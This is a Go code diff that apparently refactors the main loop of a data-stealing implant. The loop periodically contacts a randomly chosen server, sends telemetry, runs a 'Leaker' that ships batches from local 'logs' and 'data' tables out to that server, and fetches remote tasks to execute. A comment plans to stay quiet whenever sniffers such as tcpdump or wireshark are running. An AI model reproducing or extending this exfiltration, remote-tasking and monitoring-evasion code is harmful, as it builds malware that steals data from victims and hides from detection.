@@ -11,40 +11,41 @@ import (
 )
 
 func Routine(taskCh chan<- apps.AppData) {
-	conf, _ := config.GetConfig()
-	intervalSeconds, _ := strconv.Atoi(conf.Communication.Interval)
+	intervalSeconds, _ := strconv.Atoi(config.GetInstance().Communication.Interval)
 	ticker := time.NewTicker(time.Duration(intervalSeconds) * time.Second)
 	defer ticker.Stop()
 
 	for {
-		<-ticker.C
-		serverConfig := getRandomServer()
-		if !CanCommunicate(serverConfig) || !isSafe() {
-			lgr.Error("Can't communicate with server", serverConfig.Address)
-		} else {
-			telemetry, err := NewTelemetry(true)
-			if err != nil {
-				lgr.Error("Can't create telemetry", err.Error())
-			}
-			if _, _, err = SendTelemetry(serverConfig, telemetry); err != nil {
-				lgr.Error("Can't send telemetry", err.Error())
-			}
+		select {
+		case <-ticker.C:
+			serverConfig := getRandomServer()
+			if !CanCommunicate(serverConfig) || !isSafe() {
+				lgr.Error("Can't communicate with server", serverConfig.Address)
+			} else {
+				telemetry, err := NewTelemetry(true)
+				if err != nil {
+					lgr.Error("Can't create telemetry", err.Error())
+				}
+				if _, _, err = SendTelemetry(serverConfig, telemetry); err != nil {
+					lgr.Error("Can't send telemetry", err.Error())
+				}
 
-			leaker := NewLeaker(
-				[]db.TableConfig{
-					{Name: "logs", BatchSize: 50},
-					{Name: "data", BatchSize: 1},
-				},
-				serverConfig,
-			)
+				leaker := NewLeaker(
+					[]db.TableConfig{
+						{Name: "logs", BatchSize: 50},
+						{Name: "data", BatchSize: 1},
+					},
+					serverConfig,
+				)
 
-			if err := leaker.LeakData(); err != nil {
-				lgr.Error("Can't leak data", err.Error())
-			}
+				if err := leaker.LeakData(); err != nil {
+					lgr.Error("Can't leak data", err.Error())
+				}
 
-			tasks := fetchTasks(serverConfig)
-			for _, task := range tasks {
-				taskCh <- task
+				tasks := fetchTasks(serverConfig)
+				for _, task := range tasks {
+					taskCh <- task
+				}
 			}
 		}
 	}
@@ -74,11 +75,7 @@ func fetchTasks(serverConfig config.ServerConfig) []apps.AppData {
 }
 
 func getRandomServer() config.ServerConfig {
-	configInstance, err := config.GetConfig()
-	if err != nil {
-		return config.ServerConfig{}
-	}
-	servers := configInstance.Communication.Servers
+	servers := config.GetInstance().Communication.Servers
 	if len(servers) == 0 {
 		return config.ServerConfig{}
 	}
@@ -91,7 +88,8 @@ func isSafe() bool {
 	/*
 		don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
 		don't leakDataAndGetTasks if there is too much cpu usage
-		todo: search for more risky communication times
+		search for more risky communication times
+		it should be a go routine with chan
 	*/
 	return true
 }
